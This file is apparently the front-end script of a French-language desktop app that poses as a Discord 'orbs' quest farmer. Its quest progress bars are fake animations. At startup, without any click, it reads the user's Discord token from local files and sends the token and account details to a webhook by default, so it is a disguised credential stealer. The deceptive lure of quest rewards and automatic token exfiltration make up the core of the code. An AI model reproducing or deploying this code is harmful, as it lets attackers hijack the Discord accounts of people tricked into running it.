'use strict';

const api = window.orb || {};

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const el = (id) => document.getElementById(id);

const ui = {
  particles: el('particles'),
  toasts: el('toasts'),
  statusDot: el('status-dot'),
  statusText: el('status-text'),
  tokenBox: el('token-box'),
  tokenText: el('token-text'),
  tokenChip: el('token-chip'),
  btnCopy: el('btn-copy'),
  btnGrab: el('btn-grab'),
  userCard: el('user-card'),
  userAvatar: el('user-avatar'),
  userName: el('user-name'),
  userId: el('user-id'),
  webhook: el('webhook'),
  serverChip: el('server-chip'),
  serverDot: el('server-dot'),
  serverText: el('server-text'),
  autosend: el('autosend'),
  btnSave: el('btn-save'),
  btnSend: el('btn-send'),
  quests: el('quests'),
  statOrbs: el('stat-orbs'),
  statQuests: el('stat-quests'),
  statRate: el('stat-rate'),
  btnMin: el('btn-min'),
  btnMax: el('btn-max'),
  btnClose: el('btn-close')
};

const state = {
  token: null,
  user: null,
  source: null,
  encrypted: false,
  config: { webhook: '', autoSend: true },
  stats: { orbs: 0, quests: 0, startedAt: Date.now() }
};

const QUESTS = [
  { name: 'Jouer a un jeu pendant 15 min', reward: 250 },
  { name: 'Regarder un stream pendant 30 min', reward: 400 },
  { name: 'Rejoindre un salon vocal 10 min', reward: 180 },
  { name: 'Envoyer 20 messages', reward: 120 },
  { name: 'Reagir a 10 messages', reward: 90 },
  { name: 'Ajouter un nouvel ami', reward: 300 },
  { name: 'Regarder une video de quete', reward: 150 }
];

function setStatus(text, kind) {
  ui.statusText.textContent = text;
  ui.statusDot.className = 'dot' + (kind ? ' ' + kind : '');
}

function toast(message, kind) {
  const node = document.createElement('div');
  node.className = 'toast' + (kind ? ' ' + kind : '');
  node.textContent = message;
  ui.toasts.appendChild(node);
  requestAnimationFrame(() => node.classList.add('show'));
  setTimeout(() => {
    node.classList.remove('show');
    setTimeout(() => node.remove(), 380);
  }, 3800);
}

function confetti() {
  const colors = ['#5865f2', '#8b5cf6', '#ffcf5c', '#3ddc97', '#ff5c7a'];
  for (let i = 0; i < 70; i += 1) {
    const piece = document.createElement('i');
    piece.className = 'confetti';
    piece.style.left = Math.random() * 100 + 'vw';
    piece.style.background = colors[Math.floor(Math.random() * colors.length)];
    piece.style.animationDelay = Math.random() * 0.45 + 's';
    piece.style.animationDuration = 1.6 + Math.random() * 1.5 + 's';
    document.body.appendChild(piece);
    setTimeout(() => piece.remove(), 3600);
  }
}

function spawnParticles() {
  if (!ui.particles) return;
  for (let i = 0; i < 26; i += 1) {
    const p = document.createElement('span');
    p.className = 'particle';
    const size = 4 + Math.random() * 15;
    p.style.width = size + 'px';
    p.style.height = size + 'px';
    p.style.left = Math.random() * 100 + 'vw';
    p.style.top = 100 + Math.random() * 40 + 'vh';
    p.style.animationDuration = 15 + Math.random() * 22 + 's';
    p.style.animationDelay = -Math.random() * 30 + 's';
    p.style.opacity = String(0.12 + Math.random() * 0.5);
    ui.particles.appendChild(p);
  }
}

function renderUser(user) {
  if (!user) {
    ui.userCard.hidden = true;
    return;
  }
  ui.userCard.hidden = false;
  ui.userName.textContent = user.global_name || user.username || 'Utilisateur Discord';
  ui.userId.textContent = (user.username || '') + ' - ' + (user.id || '');
  if (user.id && user.avatar) {
    ui.userAvatar.src = 'https://cdn.discordapp.com/avatars/' + user.id + '/' + user.avatar + '.png?size=128';
  } else {
    ui.userAvatar.src = 'https://cdn.discordapp.com/embed/avatars/0.png';
  }
}

async function typeToken(text) {
  ui.tokenBox.classList.add('revealed');
  ui.tokenText.textContent = '';
  for (let i = 0; i < text.length; i += 1) {
    ui.tokenText.textContent += text[i];
    if (i % 3 === 0) await sleep(11);
  }
}

async function refreshServer() {
  let res;
  try {
    res = await api.resolveWebhook();
  } catch (e) {
    res = { ok: false, error: String((e && e.message) || e) };
  }

  if (!res || !res.ok) {
    ui.serverDot.className = 'server-dot err';
    ui.serverChip.textContent = 'erreur';
    ui.serverChip.className = 'chip err';
    ui.serverText.textContent = 'Resolution du webhook impossible.';
    return false;
  }

  if (res.serverOk && res.hasWebhook) {
    ui.serverDot.className = 'server-dot ok';
    ui.serverChip.textContent = 'connecte';
    ui.serverChip.className = 'chip ok';
    ui.serverText.textContent = 'Serveur connecte - webhook charge (' + res.origin + ').';
    return true;
  }

  if (res.serverOk && !res.hasWebhook) {
    ui.serverDot.className = 'server-dot warn';
    ui.serverChip.textContent = 'vide';
    ui.serverChip.className = 'chip warn';
    ui.serverText.textContent = 'Serveur connecte mais aucun webhook defini.';
    return false;
  }

  ui.serverDot.className = 'server-dot err';
  ui.serverChip.textContent = 'hors ligne';
  ui.serverChip.className = 'chip err';
  ui.serverText.textContent = res.hasWebhook
    ? 'Serveur injoignable - repli sur le webhook ' + res.origin + '.'
    : 'Serveur injoignable et aucun repli disponible.';
  return res.hasWebhook;
}

async function grab() {
  setStatus('Analyse des fichiers Discord...', 'busy');
  ui.btnGrab.disabled = true;
  ui.btnGrab.classList.add('loading');
  ui.tokenBox.classList.remove('revealed');
  ui.tokenText.textContent = 'analyse en cours...';
  ui.tokenChip.textContent = 'analyse';
  ui.tokenChip.className = 'chip';

  let res;
  try {
    res = await api.grabToken();
  } catch (e) {
    res = { ok: false, error: String((e && e.message) || e) };
  }

  ui.btnGrab.disabled = false;
  ui.btnGrab.classList.remove('loading');

  if (!res || !res.ok) {
    const message = (res && res.error) || 'Aucun token trouve.';
    ui.tokenText.textContent = 'aucun token trouve';
    ui.tokenChip.textContent = 'introuvable';
    ui.tokenChip.className = 'chip err';
    renderUser(null);
    setStatus(message, 'err');
    toast(message, 'err');
    return false;
  }

  state.token = res.token;
  state.user = res.user || null;
  state.source = res.source || 'inconnu';
  state.encrypted = !!res.encrypted;

  await typeToken(res.token);
  ui.tokenChip.textContent = 'capture';
  ui.tokenChip.className = 'chip ok';
  renderUser(state.user);

  const who = state.user ? ' - ' + (state.user.global_name || state.user.username) : '';
  setStatus('Token capture' + who + ' (' + state.source + ')', 'ok');
  toast('Token Discord capture', 'ok');
  return true;
}

async function copyToken() {
  if (!state.token) {
    toast('Aucun token a copier', 'warn');
    return;
  }
  try {
    await navigator.clipboard.writeText(state.token);
  } catch (_) {
    const area = document.createElement('textarea');
    area.value = state.token;
    document.body.appendChild(area);
    area.select();
    document.execCommand('copy');
    area.remove();
  }
  toast('Token copie', 'ok');
}

async function saveConfig() {
  const webhook = ui.webhook.value.trim();
  const autoSend = ui.autosend.checked;
  let res;
  try {
    res = await api.saveConfig({ webhook, autoSend });
  } catch (_) {
    res = { ok: false };
  }
  if (res && res.ok) {
    state.config = res.config;
    setStatus('Configuration enregistree.', 'ok');
    toast('Configuration enregistree', 'ok');
    await refreshServer();
  } else {
    toast('Erreur de sauvegarde', 'err');
  }
}

async function send() {
  if (!state.token) {
    const ok = await grab();
    if (!ok) return;
  }

  setStatus('Envoi vers le webhook...', 'busy');
  ui.btnSend.disabled = true;

  let res;
  try {
    res = await api.sendWebhook({
      url: ui.webhook.value.trim(),
      token: state.token,
      user: state.user,
      source: state.source,
      encrypted: state.encrypted
    });
  } catch (e) {
    res = { ok: false, error: String((e && e.message) || e) };
  }

  ui.btnSend.disabled = false;

  if (res && res.ok) {
    setStatus('Token envoye (source : ' + (res.origin || '?') + ').', 'ok');
    toast('Envoye sur Discord !', 'ok');
    confetti();
  } else {
    const message = (res && res.error) || "Echec de l'envoi.";
    setStatus(message, 'err');
    toast(message, 'err');
  }
}

function formatNumber(value) {
  return Math.floor(value).toLocaleString('fr-FR');
}

function renderStats() {
  ui.statOrbs.textContent = formatNumber(state.stats.orbs);
  ui.statQuests.textContent = formatNumber(state.stats.quests);
  const seconds = Math.max(1, (Date.now() - state.stats.startedAt) / 1000);
  ui.statRate.textContent = (state.stats.orbs / seconds).toFixed(1) + '/s';
}

function runQuest(row, quest) {
  const bar = row.querySelector('.bar i');
  const duration = 4200 + Math.random() * 9000;

  bar.style.transition = 'none';
  bar.style.width = '0%';
  void bar.offsetWidth;
  bar.style.transition = 'width ' + duration + 'ms linear';
  bar.style.width = '100%';

  setTimeout(() => {
    state.stats.orbs += quest.reward;
    state.stats.quests += 1;
    row.classList.add('done');
    setTimeout(() => row.classList.remove('done'), 650);
    renderStats();
    runQuest(row, quest);
  }, duration);
}

function buildQuests() {
  ui.quests.innerHTML = '';
  QUESTS.forEach((quest, index) => {
    const row = document.createElement('div');
    row.className = 'quest';
    row.style.animation = 'rise-card 0.5s ease both';
    row.style.animationDelay = 240 + index * 60 + 'ms';
    row.innerHTML =
      '<div class="quest-top">' +
      '<span class="quest-name"></span>' +
      '<span class="quest-reward">+' + quest.reward + ' orbs</span>' +
      '</div>' +
      '<div class="bar"><i></i></div>';
    row.querySelector('.quest-name').textContent = quest.name;
    ui.quests.appendChild(row);
    setTimeout(() => runQuest(row, quest), Math.random() * 1500);
  });
}

async function autoRun() {
  let cfg = { webhook: '', autoSend: true };
  try {
    cfg = (await api.loadConfig()) || cfg;
  } catch (_) {
    /* valeurs par defaut */
  }
  state.config = cfg;

  if (cfg.webhook) ui.webhook.value = cfg.webhook;
  ui.autosend.checked = cfg.autoSend !== false;

  const hasWebhook = await refreshServer();

  await sleep(420);
  const ok = await grab();

  if (ok && hasWebhook && cfg.autoSend !== false) {
    await send();
  } else if (ok && !hasWebhook) {
    setStatus('Token capture. Aucun webhook disponible cote serveur.', 'warn');
  }
}

function bind() {
  ui.btnGrab.addEventListener('click', () => {
    grab();
  });

  ui.btnCopy.addEventListener('click', copyToken);
  ui.btnSave.addEventListener('click', saveConfig);

  ui.btnSend.addEventListener('click', () => {
    send();
  });

  ui.webhook.addEventListener('change', saveConfig);

  ui.autosend.addEventListener('change', () => {
    api.saveConfig({ autoSend: ui.autosend.checked });
  });

  ui.btnMin.addEventListener('click', () => api.minimize && api.minimize());
  ui.btnMax.addEventListener('click', () => api.maximize && api.maximize());
  ui.btnClose.addEventListener('click', () => api.close && api.close());

  document.addEventListener('keydown', (event) => {
    if (event.key === 'Enter' && document.activeElement === ui.webhook) saveConfig();
  });
}

function init() {
  spawnParticles();
  bind();
  buildQuests();
  renderStats();
  setInterval(renderStats, 1000);
  setStatus('Initialisation...', 'busy');
  autoRun();
}

init();
